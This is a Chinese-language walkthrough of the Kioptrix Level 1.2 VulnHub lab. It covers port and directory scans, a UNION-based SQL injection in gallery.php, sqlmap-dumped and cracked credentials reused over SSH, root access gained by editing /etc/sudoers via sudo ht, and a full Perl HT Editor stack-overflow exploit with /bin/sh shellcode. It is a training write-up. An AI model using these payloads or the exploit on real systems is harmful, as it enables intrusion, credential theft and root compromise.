# Kioptrix: Level 1.2 (#3)

2024-6-8 https://www.vulnhub.com/entry/kioptrix-level-12-3,24/

difficulty: medium

## IP

192.168.10.194

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey:
|   1024 30e3f6dc2e225d17ac460239ad71cb49 (DSA)
|_  2048 9a82e696e47ed6a6d74544cb19aaecdd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-title: Ligoat Security - Got Goat? Security ...
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
```

根据靶场提示先将 192.168.10.194 kioptrix3.com 添加到 /etc/hosts 文件中。

看看 80 web 吧，访问 http://kioptrix3.com/ ，看到显示的是一个 LotusCMS 的 CMS，提示访问 blog 的链接。

先使用 gobuster 看看有哪些目录：

```
gobuster -t 32 dir -u http://kioptrix3.com/ -k -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html,zip -e

http://kioptrix3.com/index.php            (Status: 200) [Size: 1819]
http://kioptrix3.com/modules              (Status: 301) [Size: 355] [--> http://kioptrix3.com/modules/]
http://kioptrix3.com/gallery              (Status: 301) [Size: 355] [--> http://kioptrix3.com/gallery/]
http://kioptrix3.com/data                 (Status: 403) [Size: 324]
http://kioptrix3.com/core                 (Status: 301) [Size: 352] [--> http://kioptrix3.com/core/]
http://kioptrix3.com/update.php           (Status: 200) [Size: 18]
http://kioptrix3.com/style                (Status: 301) [Size: 353] [--> http://kioptrix3.com/style/]
http://kioptrix3.com/cache                (Status: 301) [Size: 353] [--> http://kioptrix3.com/cache/]
http://kioptrix3.com/phpmyadmin           (Status: 301) [Size: 358] [--> http://kioptrix3.com/phpmyadmin/]
```

在 http://kioptrix3.com/index.php?system=Blog 页面中发现了一个用户名 loneferret，尝试使用 rockyou 的字典爆破下 login http://kioptrix3.com/index.php?system=Admin 没有找到对应的密码。

在 gallery http://kioptrix3.com/gallery/index.php 中，第二个功能区中，可以按照相关属性进行排序显示 http://kioptrix3.com/gallery/gallery.php?id=1&sort=filename#photos，经过测试，这里的id存在sql注入，id的数值后加上一个单引号就会报错：

```
http://kioptrix3.com/gallery/gallery.php?id=1%27&sort=size#photos

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' order by parentid,sort,name' at line 1Could not select category
```

使用 order by 进行测试后，发现有 6 列：

```
http://kioptrix3.com/gallery/gallery.php?id=-1  union select 1,2,3,4,5,6 -- -&sort=dateuploaded#photos
```

直接使用 sqlmap 进行爆破，找到相关数据表。发现 gallery 数据库中有 2 个表可能有用户信息：dev_accounts 和 gallarific_users

```
Database: gallery
[7 tables]
+----------------------+
| dev_accounts         |
| gallarific_comments  |
| gallarific_galleries |
| gallarific_photos    |
| gallarific_settings  |
| gallarific_stats     |
| gallarific_users     |
+----------------------+

Table: dev_accounts
[2 entries]
+----+---------------------------------------------+------------+
| id | password                                    | username   |
+----+---------------------------------------------+------------+
| 1  | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   | dreg       |
| 2  | 5badcaf789d3d1d09794d8f021f40f0e (starwars) | loneferret |
+----+---------------------------------------------+------------+

Table: gallarific_users
[1 entry]
+--------+---------+---------+---------+----------+----------+----------+----------+-----------+-----------+------------+-------------+
| userid | email   | photo   | website | joincode | lastname | password | username | usertype  | firstname | datejoined | issuperuser |
+--------+---------+---------+---------+----------+----------+----------+----------+-----------+-----------+------------+-------------+
| 1      | <blank> | <blank> | <blank> | <blank>  | User     | n0t7t1k4 | admin    | superuser | Super     | 1302628616 | 1           |
+--------+---------+---------+---------+----------+----------+----------+----------+-----------+-----------+------------+-------------+
```

现在尝试用得到的用户去登陆 cms，但是发现都不对。

尝试用上面得到的用户和密码，使用 crackmapexec 去撞一下 ssh，结果发现登陆 ssh 的用户凭据 dreg:Mast3r 和 loneferret:starwars

```
ssh -oHostKeyAlgorithms=+ssh-rsa,ssh-dss dreg@192.168.10.194

ssh -oHostKeyAlgorithms=+ssh-rsa,ssh-dss loneferret@192.168.10.194
```

drep 被限制为 /bin/rbash，无 sudo 等权限，应该是没什么提权点。

重点看 loneferret 用户，有 sudo 权限：

```
(root) NOPASSWD: !/usr/bin/su
(root) NOPASSWD: /usr/local/bin/ht
```

使用 ht 2.0.18 升级到 root 权限 按此操作 https://vk9-sec.com/ht-privilege-escalation/ 但是发现执行时 xtrem 有问题，不能打开图形界面，需要先设置一下 xterm：

```
export TERM=xterm
sudo ht
```

F3 打开 /etc/sudoers , 添加 /bin/bash , F2 保存， F10 退出，这时在查看 sudo 发现已经能够执行 /bin/bash

```
loneferret@Kioptrix3:~$ sudo -l
User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
    (root) NOPASSWD: /bin/bash
```

```
loneferret@Kioptrix3:~$ sudo /bin/bash
root@Kioptrix3:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Kioptrix3:~# cd /root
root@Kioptrix3:/root# ls
Congrats.txt  ht-2.0.18
```

另一种提权方法，尝试在 searchsploit 中进行搜索，发现可利用：

```
HT Editor 2.0.18 - File Opening Stack Overflow | linux/local/17083.pl
```

将 pl 代码下载到目标服务器，chmod +x 后，尝试执行，出现错误，目标服务器的 perl 版本为 5.8.8，17083 需要的 perl 版本为 5.010，有些函数已经变化，需要进行修改。

找到了这个修改过后的 exp 使用:

```pl
# Exploit Title: HT Editor File openning Stack Overflow (0day)
# Date: March 30th 2011
# Author: ZadYree
# Software Link: http://hte.sourceforge.net/downloads.html
# Version: <= 2.0.18
# Tested on: Linux/Windows (buffer padding may differ on W32)
# CVE : None
#!/usr/bin/perl
=head1 TITLE

HT Editor <=2.0.18 0day Stack-Based Overflow Exploit


=head1 DESCRIPTION

The vulnerability is triggered by a too large argument (+ path) which simply lets you overwrite eip.


=head2 AUTHOR

ZadYree ~ 3LRVS Team


=head3 SEE ALSO

ZadYree's blog: z4d.tuxfamily.org

3LRVS blog: 3lrvs.tuxfamily.org

Shellcodes based on
http://www.shell-storm.org/shellcode/files/shellcode-606.php
http://www.shell-storm.org/shellcode/files/shellcode-171.php

=> Thanks
=cut

my ($esp, $retaddr);
my $scz =       [       "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e" .
                                "\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8" .
                                "\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67" .
                                "\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30" .
                                "\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4" .
                                "\x53\x52\x54\x8a\xe2\xce\x81",
                                "\xeb\x17\x5b\x31\xc0\x88\x43\x07\x89\x5b" .
                                "\x08\x89\x43\x0c\x50\x8d\x53\x08\x52\x53" .
                                "\xb0\x3b\x50\xcd\x80\xe8\xe4\xff\xff\xff" .
                                "/bin/sh"       ];

print'[*]Looking for $esp and endwin()...' . "\n";

my $namez = [qw#/usr/local/bin/ht /usr/local/bin/ht#];

my $infos = get_infos(qx{uname});

my $name = $infos->[0];


print '[+]endwin() address found! (0x', $infos->[3],')' . "\n";

for my $line(qx{objdump -D $name | grep "ff e4"}) {
        $esp = "0" . $1, last if ($line =~ m{([a-f0-9]{7}).+jmp\s{4}\*%esp});
}

print '[+]$esp place found! (0x', $esp, ")\012Now exploiting..." . "\n";

my @payload = ("sudo", $infos->[0], ("A" x ($infos->[1] - length(qx{pwd}))) . reverse(pack('H*', $infos->[3])) . reverse(pack('H*', $esp)) . $infos->[2]);
exec(@payload);


sub get_infos {
                if ($_[0] =~ /Linux/) {
                        return([$namez->[0], 4108, $scz->[0], getendwin("linux")]);
                }elsif ($_[0] =~ /FreeBSD/) {
                        return([$namez->[1], 271, $scz->[1], getendwin("freebsd")]);
                }
                #Possibility to add friends ^^
}

sub getendwin {
                if ($_[0] eq "linux") {
                        my $n = $namez->[0];
                        for (qx{objdump -d $n | grep endwin}) {
                                $retaddr = $1, last if ($_ =~ m{(.*) <});
                        }
                        return($retaddr);
                }elsif ($_[0] eq "freebsd") {
                        return("282c2990");
                }
}
```
